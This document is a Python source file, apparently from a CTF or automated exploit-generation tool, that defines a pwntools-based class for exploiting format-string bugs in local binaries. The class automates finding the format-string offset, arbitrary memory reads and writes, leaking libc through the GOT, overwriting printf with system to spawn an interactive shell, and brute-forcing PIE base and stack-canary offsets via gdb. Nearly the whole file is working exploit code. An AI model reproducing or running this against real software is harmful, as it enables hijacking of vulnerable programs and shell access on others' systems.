import json

import r2pipe
from pwn import *
from subprocess import Popen, PIPE, check_output


# context.log_level = 'DEBUG'


class FmtExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        context.binary = self.binary.elf
        self.last_output = b""
        self.fmt_offset = None
        self.globals = vuln_details

    def send_payload_find_offset(self, payload):
        process = self.binary.elf.process()
        return self.apply_exploit_input(process, payload)

    def find_fmt_offset(self):
        fmt = FmtStr(self.send_payload_find_offset, numbwritten=self.globals["position"])
        return fmt.offset

    def got_overwrite_loop(self):
        self.fmt_offset = self.find_fmt_offset() if self.fmt_offset is None else self.fmt_offset
        elf = self.binary.elf
        proc = elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break vuln''')
        self.arbitrary_write({elf.got['strcat']: elf.entry}, proc)
        print("fgets got addr:", self.binary.elf.got['fgets'])

        leak, _ = self.arbitrary_read(elf.got['fgets'], proc)
        self.binary.adjust_libc_base(leak, 'fgets')

        self.arbitrary_write({elf.got['printf']: self.binary.find_function('system', search_libc=True)}, proc)

        self.apply_exploit_input(proc, b"sh\n")

        proc.interactive()

    def arbitrary_read(self, address, proc=None):
        self.fmt_offset = self.find_fmt_offset() if self.fmt_offset is None else self.fmt_offset
        off_fmt = '|%{}$s|'.format(self.fmt_offset + 1).encode()
        payload = flat(
            off_fmt.rjust(context.bytes),
            pack(address).ljust(context.bytes)
        )
        if proc is not None:
            output = self.apply_exploit_input(proc, payload)
            leak_bytes = output.split(b'|')[1].rstrip().ljust(context.bytes, b'\x00')
            leak = unpack(leak_bytes)
            return leak, payload
        return payload

    def arbitrary_write(self, write_dict, proc=None):
        self.fmt_offset = self.find_fmt_offset() if self.fmt_offset is None else self.fmt_offset
        payload = fmtstr_payload(self.fmt_offset, write_dict, numbwritten=self.globals["position"])
        if proc is not None:
            self.apply_exploit_input(proc, payload)
        return payload

    def find_pie_offset(self):
        proc = process(["gdb", self.binary.bin_path])
        proc.recvuntil(b"pwndbg> ")
        proc.sendline(b"set disable-randomization off")
        proc.recvuntil(b"pwndbg> ")
        proc.sendline(b"break _start")
        proc.recvuntil(b"pwndbg> ")
        proc.sendline(b"r")
        proc.recvuntil(b"pwndbg> ")
        proc.sendline(b"piebase")
        proc.recvuntil(b"= ")
        data = proc.recvuntil(b'\n').rstrip()
        proc.clean()
        base_address = int(data, 16)
        print(hex(base_address))

        for i in range(1000):
            payload = "|%{}$p|".format(i + 1).encode()
            proc.sendline(b"c")
            output = self.apply_exploit_input(proc, payload)
            leak_bytes = output.split(b'|')[1].rstrip()
            if b"nil" not in leak_bytes and b"null" not in leak_bytes and len(leak_bytes) > 4:
                print(leak_bytes)
                leak = int(leak_bytes, 16)
                log.info("{} - leak: {}".format(i + 1, hex(leak)))
                offset = leak - base_address
                if 0 < offset < 0xfffffff:
                    log.info("offset: {}".format(hex(offset)))
                    proc.kill()
                    return payload, offset
            proc.sendline(b"r")

        proc.kill()
        return None

    def find_canary_offset(self):
        proc = process(["gdb", self.binary.bin_path])
        proc.recvuntil(b"pwndbg> ")
        proc.sendline(b"break _start")
        proc.recvuntil(b"pwndbg> ")
        proc.sendline(b"r")
        proc.recvuntil(b"pwndbg> ")
        for i in range(1000):
            proc.sendline(b"canary")
            proc.recvuntil(b"Canary    = ")
            output = proc.recvuntil(b' ').rstrip()
            proc.clean()
            canary = int(output, 16)
            print(hex(canary))

            payload = "|%{}$p|".format(i + 1).encode()
            proc.sendline(b"c")
            output = self.apply_exploit_input(proc, payload)
            leak_bytes = output.split(b'|')[1].rstrip()
            if b"nil" not in leak_bytes:
                leak = int(leak_bytes, 16)
                log.info("{} - leak: {}".format(i + 1, hex(leak)))
                if leak == canary:
                    log.info("Found offset: {}".format(i + 1))
                    proc.kill()
                    return payload
            proc.sendline(b"r")

        proc.kill()
        return None

    def trim_input(self, input):
        input = input.replace(b'\x00', b'')
        ip = b"F" * self.binary.elf.bytes
        offset = input.index(ip)
        return input[0:offset]

    def apply_exploit_input(self, proc, payload):
        current_output = b""
        for input in self.globals["input"]:
            received_output = proc.clean()
            # log.info("Received output: {}".format(received_output))
            current_output += received_output
            fmt = b"F" * self.binary.elf.bytes
            any = b"B"
            if fmt not in input and any not in input:
                # log.info("Sending input: {}".format(input))
                proc.send(input)
            elif any in input:
                trimmed_input = input.replace(any, b"")
                proc.sendline(trimmed_input)
            elif fmt in input:
                trimmed_input = self.trim_input(input)
                exploit_payload = flat(
                    trimmed_input,
                    payload
                )
                # log.info("Payload {}".format(payload))
                # log.info("Appyling payload to input: {}".format(trimmed_input))
                proc.sendline(exploit_payload)

        current_output += proc.clean()
        return current_output
        # log.info("current output: {}".format(current_output))
